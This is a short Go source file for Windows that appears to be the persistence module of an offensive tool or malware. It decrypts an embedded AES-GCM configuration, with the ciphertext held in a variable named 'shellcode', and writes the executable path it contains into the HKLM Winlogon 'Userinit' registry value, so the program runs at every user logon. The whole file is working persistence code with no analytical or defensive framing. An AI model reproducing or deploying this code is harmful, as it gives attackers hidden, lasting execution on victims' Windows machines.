//go:build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	_ "embed"
	"encoding/base64"
	"encoding/json"
	"fmt"

	"golang.org/x/sys/windows/registry"
)

//go:embed encrypt.txt
var encryptionKey string

var robin string
var RobinConfig RegistryConfig

type RegistryConfig struct {
	Key  string
	Path string
	Hive string
}

func decrypt(encryptionKey string) []byte {
	decoded, _ := base64.StdEncoding.DecodeString(robin)
	h := sha256.New()
	h.Write([]byte(encryptionKey))
	block, _ := aes.NewCipher(h.Sum(nil))
	aesGCM, _ := cipher.NewGCM(block)
	nonceSize := aesGCM.NonceSize()
	nonce, shellcode := decoded[:nonceSize], decoded[nonceSize:]
	plaintext, _ := aesGCM.Open(nil, nonce, shellcode, nil)
	return plaintext
}

func winlogonModify(exePath string) {
	fullSZValue := fmt.Sprintf("C:\\Windows\\System32\\userinit.exe,%s", exePath)
	key, _ := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, registry.WRITE)
	defer key.Close()

	key.SetStringValue("Userinit", fullSZValue)
}

func main() {
	decrypted := decrypt(encryptionKey)
	json.Unmarshal(decrypted, &RobinConfig)

	executable := RobinConfig.Path

	winlogonModify(executable)
}
